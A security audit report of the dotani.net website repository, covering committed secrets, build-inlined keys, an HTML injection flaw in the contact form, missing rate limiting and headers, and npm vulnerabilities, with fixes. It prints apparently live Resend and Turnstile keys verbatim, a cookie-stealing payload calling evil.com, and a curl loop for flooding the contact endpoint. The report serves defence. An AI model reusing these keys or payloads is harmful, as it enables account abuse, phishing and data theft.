# Security Audit — dotani.net

**Date:** 30 June 2026  
**Scope:** Full repository — source, build output, git history, dependencies, transport  
**Method:** File-by-file inspection, git history traversal, npm audit, build artifact analysis  
**Status:** Pre-fix investigation only — no changes made

---

## Summary

| Severity | Count | Action |
|----------|-------|--------|
| **Critical** | 3 | Fix today |
| **High** | 4 | Fix this week |
| **Medium** | 3 | Backlog |
| **Low** | 3 | Backlog |

---

## CRITICAL

### C1 — Live secrets committed to git in `apps/studio/.env.example`

**File:** `apps/studio/.env.example` (tracked in git, present at HEAD)  
**Evidence:**
```
$ git show HEAD:apps/studio/.env.example
PUBLIC_TURNSTILE_SITE_KEY=0x4AAAAAADmC3ny7xGtMoEhF
TURNSTILE_SECRET_KEY=0x4AAAAAADmC3g4HqmfIsKumoyxK_9MaMvA
RESEND_API_KEY=re_6E3NsNpd_6QUog69UeU7LfV4HKtje8mWe
PUBLIC_CALCOM_USERNAME=dotani
CONTACT_TO_EMAIL=online@dotani.net
```

**How it happened:** Commit `a88930d` ("Restructure into Astro web and Sanity studio monorepo") created this file from a previous `.env.example` that already contained live keys. The root `.gitignore` has `!.env.example` which explicitly un-ignores `.env.example` files. Both `apps/studio/.env.example` AND `apps/web/.env.example` are tracked — the studio one contains live keys, the web one has placeholders.

**History depth:** The same live keys were also present in `dotaninet/.env.example` at commit `5490780` (deeper in history). That file was renamed during the monorepo restructure but the old commit still exists on `main`.

**What's exposed:**
- `RESEND_API_KEY` — `re_6E3NsNpd_6QUog69UeU7LfV4HKtje8mWe` — anyone with this can send email through your Resend account, spoofing your domain.
- `TURNSTILE_SECRET_KEY` — `0x4AAAAAADmC3g4HqmfIsKumoyxK_9MaMvA` — allows bypassing Turnstile verification on any site using this secret.
- `CONTACT_TO_EMAIL` — `online@dotani.net` — spam target confirmation.

**Exploit scenario:** Clone the repo → `git show HEAD:apps/studio/.env.example` → use the Resend key to send phishing emails from `contact@dotani.net` → victims trust it because SPF/DKIM passes for your domain.

**Fix:**
1. Rotate the Resend API key immediately (revoke at resend.com)
2. Rotate the Turnstile secret key immediately (regenerate at dash.cloudflare.com)
3. Replace `apps/studio/.env.example` with placeholder values and commit
4. Purge the secret from git history OR accept it's exposed and use rotated keys
5. Consider removing `!.env.example` from `.gitignore` and instead rename to `.env.example.template` or move to a docs directory

---

### C2 — Secrets inlined in build output (`dist/server/chunks/contact_*.mjs`)

**File:** `apps/web/dist/server/chunks/contact_CR2LLvzt.mjs`  
**Evidence (verbatim):**
```js
secret: "0x4AAAAAADmC3g4HqmfIsKumoyxK_9MaMvA",
Authorization: `Bearer ${"re_6E3NsNpd_6QUog69UeU7LfV4HKtje8mWe"}`,
to: "online@dotani.net",
from: "contact@dotani.net",
```

**How it happened:** `@astrojs/cloudflare` inlines `import.meta.env.*` values at build time. The local `apps/web/.env` had live secrets, so they got baked into the compiled worker bundle. The `dist/` directory is gitignored but the deployed site (`dotani.net`) serves this worker.

**What's exposed:** Every deployed Cloudflare Pages Function contains the full Resend API key, Turnstile secret, and contact email in plaintext within the worker script. Anyone who can fetch the worker source (e.g., via source map discovery, debug endpoints, or a Cloudflare dashboard viewer with access) can extract them.

**Exploit scenario:** If Cloudflare ever exposes worker source in error responses, or if a collaborator with Pages access views the deployment, the keys are in plain text in the compiled code.

**Fix:**
1. Rotate both keys (same as C1 — rotate after fixing)
2. Set `import.meta.env.*` values via Cloudflare Pages environment variables (not `.env` file) so they're injected at runtime, not build time
3. Rebuild and redeploy with clean build (the file MUST be regenerated)
4. Verify the new build has `secret: import.meta.env.TURNSTILE_SECRET_KEY` instead of the literal value

---

### C3 — HTML injection in contact form email body

**File:** `apps/web/src/pages/api/contact.ts:36-41`  
**Evidence:**
```ts
html: `
  <h2>New Contact Form Submission</h2>
  <p><strong>Name:</strong> ${name}</p>
  <p><strong>Email:</strong> ${email}</p>
  <p><strong>Message:</strong> ${message}</p>
`,
```

**What's wrong:** Three user-controlled fields (`name`, `email`, `message`) are interpolated directly into an HTML email template with zero escaping. No `encodeURI`, no `sanitize-html`, no `DOMPurify`, no template engine auto-escaping.

**Proof of exploit:**
```
name:  <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
email:  test@test.com
message:  <style>@import url('https://evil.com/exfil')</style>
```

While most email clients strip `<script>`, they do render `<img onerror>`, `<style>`, `<a>` tags. An attacker can:
- Render phishing links ("Click here to confirm your account")
- Use `<img>` tags to exfiltrate data via image load requests (tracking pixels)
- Inject `<base>` tags to hijack relative URLs
- Inject `<style>` tags to probe CSS-based data exfiltration

**Subject line vulnerability (same file, line 35):**
```ts
subject: `New contact form submission from ${name}`
```
If `name` contains newline characters (`\r\n`), the attacker can inject email headers (Bcc, Reply-To, etc.) — classic SMTP header injection.

**Fix:**
1. Strip HTML tags from all three fields before email generation (regex or `strip_tags` equivalent)
2. Or use a template engine that auto-escapes (Astro's template literals don't)
3. Or use Resend's `text` field instead of `html` (but you'd lose formatting)
4. Sanitize the subject line: strip newlines, truncate to 100 chars, encode HTML entities
5. Add required-field validation server-side: return 400 if any field is empty

---

## HIGH

### H1 — No rate limiting on `/api/contact`

**File:** `apps/web/src/pages/api/contact.ts` (entire file)  
**Evidence:** Zero rate-limiting code in the file. No KV-based counters, no IP tracking, no token bucket. The SESSION KV namespace (`wrangler.jsonc:10`) is defined but never referenced in any source file — it is dead configuration.

**Exploit scenario:** 
```
for i in {1..10000}; do curl -X POST https://dotani.net/api/contact -d "name=Spam&email=spam@spam.com&message=Buy now"; done
```
This would drain your Resend monthly quota (100 free emails/month on the trial plan) in seconds, then start incurring charges or blocking legitimate submissions. No Turnstile stop this if the attacker solves one CAPTCHA per request, or if they use headless browsers.

**Fix:** Implement KV-based rate limiting using the already-provisioned SESSION KV:
```ts
const ip = request.headers.get('CF-Connecting-IP')
const key = `rate:${ip}`
const count = await context.env.SESSION.get(key)
if (count && parseInt(count) > 5) return new Response('Too many requests', { status: 429 })
// increment on each request, TTL 1 hour
```

---

### H2 — No security headers (CSP, HSTS, X-Frame-Options, etc.)

**File:** `apps/web/dist/client/_headers` (only existing headers file)  
**Evidence:**
```
/_astro/*
  Cache-Control: public, max-age=31536000, immutable
```
That's it. No `public/_headers` in source. No middleware setting headers. The build script doesn't generate security headers.

**Exploit scenario:** Without `X-Frame-Options: DENY`, an attacker can embed dotani.net in an `<iframe>` on a malicious site (clickjacking). Without CSP, any XSS vulnerability (including C3) allows full exploitation — there's no second line of defense. Without HSTS, a man-in-the-middle can downgrade HTTPS on the first visit.

**Fix:** Create `apps/web/public/_headers`:
```
/*
  X-Frame-Options: DENY
  X-Content-Type-Options: nosniff
  Referrer-Policy: strict-origin-when-cross-origin
  Permissions-Policy: camera=(), microphone=(), geolocation=()
  Strict-Transport-Security: max-age=31536000; includeSubDomains
  Content-Security-Policy: default-src 'self'; script-src 'self' https://challenges.cloudflare.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https://cdn.sanity.io; connect-src 'self' https://api.resend.com https://challenges.cloudflare.com; frame-src https://challenges.cloudflare.com; base-uri 'self'
```

---

### H3 — 5 high-severity npm vulnerabilities (undici)

**Evidence from `npm audit --workspace apps/web`:**
```
undici  7.0.0 - 7.27.2
7 high-severity advisories including:
  - TLS certificate validation bypass via dropped requestTls in SOCKS5 ProxyAgent
  - HTTP header injection via Set-Cookie percent-decoding
  - Cross-origin request routing via SOCKS5 proxy pool reuse
  - HTTP response queue poisoning via keep-alive socket reuse
  - Set-Cookie SameSite downgrade
```
Affected via: `miniflare` → `wrangler` → `@astrojs/cloudflare`

Also `ws` (2 high: uninitialized memory disclosure, memory exhaustion DoS) via `miniflare`.

**Impact:** `undici` is Node.js' HTTP client. These are in Cloudflare's dev toolchain (`miniflare`, `wrangler`), not in production Workers runtime. The risk is during development — an attacker-controlled SOCKS5 proxy could intercept dev traffic.

**Fix:** `npm audit fix` will upgrade `undici` to >7.27.2. If that fails, `npm update undici --depth 5` or pin resolutions in package.json.

---

### H4 — No input validation on contact form (server-side)

**File:** `apps/web/src/pages/api/contact.ts:5-7`  
**Evidence:**
```ts
const name = formData.get('name') as string
const email = formData.get('email') as string
const message = formData.get('message') as string
```

- No `required` check — empty strings pass through
- No length limits — 1MB message bodies are accepted
- No email format validation — `not-an-email` passes
- `as string` silently coerces `null` to the string `"null"` when a field is missing

**Combined with C3:** A user can send a 10MB message containing HTML injection payloads, and it all goes into the email body.

**Fix:**
```ts
if (!name || !email || !message) return new Response(JSON.stringify({ error: 'All fields required' }), { status: 400 })
if (name.length > 100 || message.length > 5000) return new Response(JSON.stringify({ error: 'Field too long' }), { status: 400 })
if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return new Response(JSON.stringify({ error: 'Invalid email' }), { status: 400 })
```

---

## MEDIUM

### M1 — `novalidate` on form with no client-side validation

**File:** `apps/web/src/components/ContactForm.astro:40`  
**Evidence:**
```astro
<form ... novalidate>
```

`novalidate` disables HTML5 native validation. The client-side `<script>` block (114 lines) also performs zero validation before `fetch()`. Empty fields, invalid emails, and oversized payloads are sent straight to the server.

This is redundant with H4 but widens the attack surface — bot scripts also see no client-side barriers.

**Fix:** Remove `novalidate` and let the browser handle basic `required` + `type="email"` validation. Add a client-side length check in the submit handler.

---

### M2 — `esbuild` Windows arbitrary file read (dev server)

**CVE:** GHSA-g7r4-m6w7-qqqr  
**Evidence from `npm audit`:**
```
esbuild  0.27.3 - 0.28.0
esbuild allows arbitrary file read when running the development server on Windows
```
Affected via: `astro`, `wrangler`, `@astrojs/cloudflare`

**Impact:** When running `npm run dev` on Windows, a crafted URL to the Astro dev server can read arbitrary files from the filesystem. This is dev-only, not production.

**Fix:** `npm audit fix --force` upgrades `astro` to 7.x (breaking). Alternative: upgrade `esbuild` directly with `npm update esbuild --depth 5` or override resolutions.

---

### M3 — No `Content-Type: application/json` on API responses

**File:** `apps/web/src/pages/api/contact.ts:22,46,49`  
**Evidence:**
```ts
return new Response(JSON.stringify({ error: 'Turnstile verification failed' }), { status: 400 })
```
No `headers: { 'Content-Type': 'application/json' }` on any response. Browsers may MIME-sniff the response body, potentially interpreting error messages as HTML.

**Fix:** Add `headers: { 'Content-Type': 'application/json' }` to all `new Response()` calls, or use Astro's `Response` helper.

---

## LOW

### L1 — Sanity project ID and dataset hardcoded as fallbacks

**File:** `apps/web/src/lib/sanity.ts:4-5`  
**Evidence:**
```ts
const projectId = import.meta.env.PUBLIC_SANITY_PROJECT_ID || 'tmw5kvr6'
const dataset = import.meta.env.PUBLIC_SANITY_DATASET || 'staging'
```

These are public identifiers, not secrets. But hardcoding them bypasses the environment variable system — if someone deploys without setting env vars, they silently use staging data.

**Fix:** Remove the fallbacks and let it fail loudly if env vars aren't set.

---

### L2 — Studio `visionTool` enabled on deployed staging

**File:** `apps/studio/sanity.config.ts:25`  
**Evidence:**
```ts
visionTool({ defaultApiVersion: '2024-01-01' }),
```

The Studio is deployed to Sanity's managed hosting (appId `p41gm56ynq0ht9tskrershxl` per sanity.cli.ts). `visionTool` allows arbitrary GROQ queries against the configured dataset. If the Studio URL is discoverable and Sanity project access controls aren't locked down, anyone can query all staged content.

**Fix:** Remove `visionTool` from production config or gate it behind `process.env.NODE_ENV`.

---

### L3 — SESSION KV namespace is dead configuration

**File:** `wrangler.jsonc:7-12`  
**Evidence:** The `SESSION` KV binding (`b9ad3899f30d4a1ba9cf41a5d3b5aa17`) is declared in both the default and production environments but is never referenced in any `.ts`, `.astro`, or `.mjs` file. It's configured, provisioned in Cloudflare, and costs a namespace slot for nothing.

**Fix:** Remove the `kv_namespaces` block from `wrangler.jsonc` unless Astro's internal session driver actually requires it (test first).

---

## Appendix: Verification Commands Used

| Check | Command | Result |
|-------|---------|--------|
| Git remote | `git remote -v` | `origin https://github.com/thedotani/dotani.net.git` |
| Repo public/private | Cannot determine from local clone — check GitHub UI |
| .env in git | `git ls-files --cached \| Select-String "\.env"` | `apps/studio/.env.example`, `apps/web/.env.example` |
| .env content at HEAD | `git show HEAD:apps/studio/.env.example` | Live keys confirmed |
| History origin | `git log -p --all -- apps/studio/.env.example` | Created at `a88930d` from pre-existing live `.env.example` |
| Build inlined secrets | `Select-String "re_" apps/web/dist/server/chunks/contact_*.mjs` | `Bearer ${"re_6E3NsNpd_6QUog69UeU7LfV4HKtje8mWe"}` found |
| npm audit (web) | `npm audit --workspace apps/web` | 13 vulns: 3 low, 5 moderate, 5 high |
| npm audit (studio) | `npm audit --workspace apps/studio` | 16 vulns: 1 low, 10 moderate, 5 high |
| Rate limiting | `Select-String "rate.?limit\|throttle\|429" apps/web/src/**/*` | No matches |
| CSP/HSTS | `Get-Content apps/web/dist/client/_headers` | Only Cache-Control |
| KV usage | `Select-String "SESSION" apps/web/src/**/*` | No matches in source |
| CORS | `Select-String "Access-Control\|OPTIONS" apps/web/src/**/*` | No matches |
| Middleware | `Get-ChildItem -Recurse -Filter "*middleware*" apps/web/src/` | No files found |
| _routes.json | `Test-Path apps/web/dist/_routes.json` | Does not exist (not generated after most recent build) |
